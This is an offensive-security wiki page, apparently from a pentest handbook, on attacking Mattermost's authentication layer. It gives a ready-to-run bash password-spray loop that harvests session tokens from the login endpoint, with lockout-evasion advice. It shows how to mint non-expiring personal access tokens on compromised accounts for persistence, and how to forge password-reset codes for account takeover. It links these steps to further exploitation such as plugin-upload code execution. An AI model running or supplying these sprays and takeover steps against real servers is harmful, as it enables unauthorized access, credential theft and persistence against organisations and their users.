---
title: "Authentication"
description: "Attacking the Mattermost auth layer: POST /api/v4/users/login returns a session in the Token response header and the MMAUTHTOKEN cookie, so spraying is a loop over that endpoint reading the header. Covers session and personal-access-token handling, SSO and MFA gaps, and the /api/v4/users/password/reset flow. Worked login curl reading the Token header, a spray loop, and interpreting 200 versus 401."
keywords:
  - mattermost login
  - mmauthtoken
  - password spraying
  - personal access token
  - password reset
---

# Authentication

Every authenticated `/api/v4` call needs a session token, and the only ways to get one are the password login, a personal access token, or an SSO exchange. The login endpoint is a clean spray target because it is unthrottled on many builds and returns the token directly in a response header, so a successful guess hands you an immediately usable Bearer credential with no second round-trip.

## The login flow and where the token lands

`POST /api/v4/users/login` takes `login_id` (username or email) and `password`. On success the body is the user object, and the session token is returned both in the `Token` response header and as the `MMAUTHTOKEN` cookie:

```http
POST /api/v4/users/login HTTP/1.1
Host: target:8065
Content-Type: application/json

{"login_id":"j.doe@corp.test","password":"Autumn2026!"}
```

```text
HTTP/1.1 200 OK
Token: kp8w3mz7...         <-- this is your session token
Set-Cookie: MMAUTHTOKEN=kp8w3mz7...; HttpOnly
X-Version-Id: 9.5.0...
```

Read the `Token` header, not the body, for the credential. Use it as `Authorization: Bearer kp8w3mz7...` on every subsequent call. A `401` with `id":"api.user.login.invalid_credentials_email_username"` is a failed guess.

## Spraying

Because the token is in the header on a `200`, a spray loop is a single pass that flags hits by status and captures the token in the same request:

```bash
PASS='Autumn2026!'
while read u; do
  tok=$(curl -sk -D - -o /dev/null -X POST http://<target>:8065/api/v4/users/login \
        -H 'Content-Type: application/json' \
        -d "{\"login_id\":\"$u\",\"password\":\"$PASS\"}" | awk 'tolower($1)=="token:"{print $2}')
  [ -n "$tok" ] && echo "HIT $u -> $tok"
done < users.txt
```

Interpret: any line printing `HIT` is a valid credential and a live session token in one. Keep the rate low and the password common across the whole user list (one password, many users) to avoid the per-account lockout that some builds apply after repeated failures against a single account. MFA, where enabled, turns the `200` into a `MFA required` response (`id":"mfa.validate_token...`) so a spray hit on an MFA account still proves the password even though the token is withheld.

## Personal access tokens

Personal access tokens are long-lived, non-expiring Bearer tokens. Where `EnableUserAccessTokens` is on, any user (or you, on a popped account) can mint one for persistence:

```http
POST /api/v4/users/me/tokens HTTP/1.1
Host: target:8065
Authorization: Bearer <session-token>
Content-Type: application/json

{"description":"ci"}
```

The response `token` field is a credential that survives logout and password change, making it the preferred foothold to keep. A stolen token (from the enumeration IDOR, a logged request, or the webhook/integration config) is used identically.

## Password reset

`POST /api/v4/users/password/reset` consumes a reset `code` and a new password; `POST /api/v4/users/password/reset/send` triggers the email. The offensive value is in the token-handling: where the reset `code` is derived from predictable material (user id plus a weak or leaked signing secret, which the config-file traversal in [server exploitation](server-exploitation.md) can expose) the code can be forged, converting "I know the email" into account takeover without inbox access:

```http
POST /api/v4/users/password/reset HTTP/1.1
Host: target:8065
Content-Type: application/json

{"code":"<reset-token>","new_password":"Owned-Passw0rd!"}
```

A `200` means the password was changed; log in with the new password to take the account.

## Follow-on

Any token from here is the input to everything else: feed it to the [enumeration](enumeration.md) directory reads, and if the account carries `system_admin` (or you reset an admin's password) proceed directly to the plugin-upload code execution in [server exploitation](server-exploitation.md).

## Tools

- [mattermost/mattermost (server source, to read the login and token handlers per build)](https://github.com/mattermost/mattermost)
- Burp Intruder or the `curl` loop above for spraying.

## References

- [Mattermost API: login and sessions](https://api.mattermost.com/#tag/authentication)
- [Mattermost API: personal access tokens](https://api.mattermost.com/#tag/users)
- [Mattermost documentation: personal access tokens](https://developers.mattermost.com/integrate/reference/personal-access-token/)
